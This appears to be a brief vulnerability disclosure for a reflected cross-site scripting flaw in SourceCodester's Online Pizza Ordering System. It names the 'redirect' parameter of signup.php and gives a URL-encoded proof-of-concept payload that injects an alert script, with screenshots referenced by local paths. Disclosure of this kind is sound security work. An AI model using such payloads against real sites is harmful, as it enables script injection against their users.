vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/16166/online-pizza-ordering-system-php-free-source-code.html

Vulnerability trigger parameter: $redirect

The process of vulnerability discovery is as follows：

![image-20230223212353657](C:\markdown\images\image-20230223212353657.png)

exp

```
http://192.168.31.50/php-opos/signup.php?redirect=%27%3E%3C/script%3E%3Cscript%3Ealert(%22xss%22)%3C/script%3E
```

![image-20230223212321830](C:\markdown\images\image-20230223212321830.png)